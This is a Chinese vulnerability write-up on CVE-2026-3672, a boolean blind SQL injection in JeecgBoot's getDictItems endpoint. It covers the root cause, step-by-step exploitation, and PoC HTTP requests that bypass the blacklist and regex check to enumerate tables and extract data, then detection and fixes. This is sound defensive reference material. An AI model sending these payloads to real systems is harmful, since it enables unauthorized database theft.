---
id: web-java-framework-jeecgboot-api-dict-waf-regex-sqli
title: CVE-2026-3672 JeecgBoot /sys/api/getDictItems：字典 WAF 正则与黑名单不对称导致布尔盲注
type: scenario
domain: web
path: web/java/framework
technique: jeecgboot-api-dict-waf-regex-bypass-sqli
aliases:
- CVE-2026-3672
- JeecgBoot 3.9.1 SQL 注入
- JeecgBoot WAF 绕过
- getDictItems 布尔盲注
- specialDictSqlXssStr 缺 and/or
- isExistSqlInjectKeyword 正则绕过
- mysql.innodb_index_stats 盲注
tags:
- java
- jeecgboot
- mybatis
- sqli
- boolean-blind
- waf-bypass
- regex
- blacklist-bypass
- cve-2026-3672
cve:
- CVE-2026-3672
severity: high
confidence: high
status: verified
affected_versions: JeecgBoot 3.9.0 / 3.9.1（原文标注）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V36
  verified_at: '2026-11-05T06:05:01+08:00'
  notes: '已对照原文与18张图核对：四段式 dictCode→queryTableDictItemsByCodeAndFilter、Mapper where 、specialDictSqlXssStr 缺 and/or、isExistSqlInjectKeyword 的 \s+\S+关键字 正则与 % + # / ) 二次条件、and (select / ) from 绕过、布尔真假响应、information_schema 被拦而 mysql.innodb_index_stats 可用、脚本爆表结果均一致；入口控制器原文写作 /sys/dict/getDictItems/{dictCode} 而实测请求为 /sys/api/getDictItems?dictCode=，卡片采用实测请求，已在原理中写为路径/参数；未在本机复现。'
---

## 一句话结论

JeecgBoot 3.9.0/3.9.1 的 `GET /sys/api/getDictItems?dictCode=...` 把四段式 `dictCode` 的第四段作为 `filterSql` 直接拼进 `where ${filterSql}`；字典专用黑名单漏掉 `and`/`or`，而 `isExistSqlInjectKeyword` 只匹配“空白 + 非空白串 + 关键字”且要求命中片段含 `% + # / )`，于是 `1=1 and (select count(username) from sys_user)` 可通过校验，构成任意用户权限下的布尔盲注。

## 原理

- **入口与分段**：`SysDictController#getDictItems` 把路径/参数 `dictCode` 交给 `SysDictServiceImpl#getDictItems`；按逗号分割后，四段格式 `table,text,code,filterSql` 调用 `queryTableDictItemsByCodeAndFilter(params[0], params[1], params[2], params[3])`。前三段走表名/字段校验，第四段 `filterSql` 只走字典专用 SQL 检查。
- **Sink**：`SysDictMapper.xml` 的 `queryTableDictWithFilterSqlFragment` 为 `select ${text} as "text", ${code} as "value" from ${table} where ${filterSql}`，`filterSql` 原样拼接，没有参数化。
- **黑名单不对称**：默认 `XSS_STR` 含 `and | ... | or | ...`，字典专用 `specialDictSqlXssStr` 却只含 `exec/insert/select/delete/update/drop/count/chr/mid/...`，**没有 `and ` 与 `or `**。因此布尔条件的关键字不受黑名单约束。
- **正则缺陷**：`isExistSqlInjectKeyword(sql, keyword)` 先判断 `sql.startsWith(keyword)`；否则用 `sql.contains(keyword)` 预筛，构造 `matchingText = " " + keyword`（仅一个普通空格），特殊项（`;`、`+`、`--`）才用原关键字；随后用 `\s+\S+<keyword>` 找片段，并只在片段包含 `%`、`+`、`#`、`/`、`)` 时才判定命中。
- **绕过实例**：`and (select count(username) from sys_user)` 中，`select` 的命中片段是 ` (select`，不含 `)`（右括号在子查询末尾，不在该片段），不报警；`from` 前的字符是空格，`\s+\S+from` 需要空白后至少一个非空白再接 `from`，`) from` 无法匹配，不报警。`and` 本身不在字典黑名单。
- **Oracle**：接口返回 JSON 数组；条件为真时返回非空数组，条件为假时返回空数组或错误 JSON。无需回显或报错。
- **库表枚举**：`information_schema` 在黑名单中，但 `mysql.innodb_index_stats` 未过滤，可用 `database_name=database()` 和 `table_name` 枚举当前库的表名；再用 `count`/`length`/字符串比较/`like` 逐字符取数据。
- **权限**：原文标注“需要任意用户权限”，请求需携带有效 `X-Access-Token`（JWT），不是完全未授权。

## 触发条件

- JeecgBoot 3.9.0 或 3.9.1（原文标注）。
- 攻击者持有任意有效用户的 `X-Access-Token`。
- 目标可访问 `/jeecg-boot/sys/api/getDictItems`，`dictCode` 四段式解析与 `filterSql` 拼接逻辑存在。
- 数据库为 MySQL（`database()`、`mysql.innodb_index_stats`、字符串比较/`like`）。
- 响应能区分“非空数组/空数组或错误”。

## 利用步骤

1. 用任意用户登录，取得 `X-Access-Token`。
2. 确认布尔 oracle：`dictCode=sys_user,username,id,1=1 and (length(database())=1)`；为真返回非空数组。
3. 用 `mysql.innodb_index_stats` 枚举当前库表数量、表名长度与字符：
   - 表数量：`1=1 and ((select count(distinct table_name) from mysql.innodb_index_stats where database_name=database())>=N)`
   - 表名：`1=1 and ((select min(table_name) from mysql.innodb_index_stats where database_name=database())>'z')`，逐字符前缀比较。
4. 根据业务字典猜测常见字段名，判断字段是否存在：`1=1 and (select count(<field>) from <table>)>=0`。
5. 用 `exists(select 1 from <table> where cast(<field> as char) like '<prefix>%')` 逐字符取内容；多行时先按主键 `min(id)`/`id > 上一行` 定位下一行。
6. 通过响应是否为非空数组记录 True/False，脚本化二分或逐字符枚举。

## PoC

```http
GET /jeecg-boot/sys/api/getDictItems?dictCode=sys_user,username,id,1=1%20and%20(select%20count(username)%20from%20sys_user) HTTP/1.1
Host: localhost:8080
X-Access-Token: <任意用户 JWT>
```

布尔假（返回空数组）：

```http
GET /jeecg-boot/sys/api/getDictItems?dictCode=sys_user,username,id,1=1%20and%20(length(database())=1) HTTP/1.1
Host: localhost:8080
X-Access-Token: <任意用户 JWT>
```

表名枚举（判定当前库是否有至少 124 张表）：

```http
GET /jeecg-boot/sys/api/getDictItems?dictCode=sys_user,username,id,1=1%20and%20((select%20count(distinct%20table_name)%20from%20mysql.innodb_index_stats%20where%20database_name=database())%3e=124) HTTP/1.1
```

字段/数据探测：

```http
GET /jeecg-boot/sys/api/getDictItems?dictCode=sys_user,username,id,1=1%20and%20(select%20count(id)%20from%20aigc_word_template)%3e=0 HTTP/1.1
GET /jeecg-boot/sys/api/getDictItems?dictCode=sys_user,username,id,1=1%20and%20exists(select%201%20from%20aigc_word_template%20where%20cast(id%20as%20char)%20like%20'1957%25') HTTP/1.1
```

`information_schema` 会被过滤（返回“校验失败，存在 SQL 注入风险”），而 `mysql.innodb_index_stats` 可用。

## 变体与关联

- 变体：`and` 换成 `or`（同样不在字典黑名单），可构造恒真/恒假或跨条件注入。
- 变体：若 `information_schema` 也需使用，可尝试大小写、注释、内联注释或 FROM 子句变形，但原文未验证。
- 变体：表/字段名已知时，可直接把目标字段放在 `text` 位读取，减少盲注量。
- 关联：[[web-java-framework-jeecgboot-dict-filter-sql-injection]]（同一 `filterSql` 拼接根因的另一条入口 `/sys/dict/getDictItems`，那条利用 Shiro 后缀绕过与 `#`/`or` 黑名单缺项；本条是 `/sys/api/getDictItems`，WAF 正则与 `and/or` 缺项，入口、权限与 PoC 不同）。
- 关联：[[web-java-framework-jeecgboot-dict-blacklist-bypass-sqli]]（同一字典子系统的其他黑名单缺口：`select%0a`、`current_user`、`innodb_table_stats`、`loadTreeData` 透传；本条聚焦 `isExistSqlInjectKeyword` 的正则匹配缺陷）。
- 关联：[[web-generic-sqli-exists-left-boolean-oracle]]（布尔 oracle 通用方法）。
- 关联：[[web-generic-sqli-keyword-double-write-bypass]]（黑名单/关键字过滤绕过的其他思路）。

## 检测与防御

- **日志检测**：`dictCode` 含四个逗号段且第四段出现 `and`、`or`、子查询、`mysql.innodb_index_stats`、`like`、`cast`；同一用户高频请求字典接口且返回数组在空/非空间变化；`X-Access-Token` 来自低权限账号。
- **WAF 检测**：不要只用原始字符串黑名单；解码后对 `filterSql` 做语法解析，识别布尔表达式、子查询、系统表访问；当前规则对 `and (select` 与 `) from` 均无命中。
- **修复**：禁止外部传入四段式 `dictCode` 的 `filterSql`；Mapper 删除 `where ${filterSql}`，改为“字段白名单 + 参数化值”；表名/字段名只允许服务端映射，不能直接 `${}`。
- **加固**：升级到修复版本；字典接口增加角色/数据权限校验；数据库账号最小权限，禁止访问 `mysql.innodb_index_stats` 等系统表；对 `dictCode` 长度和段数做限制。
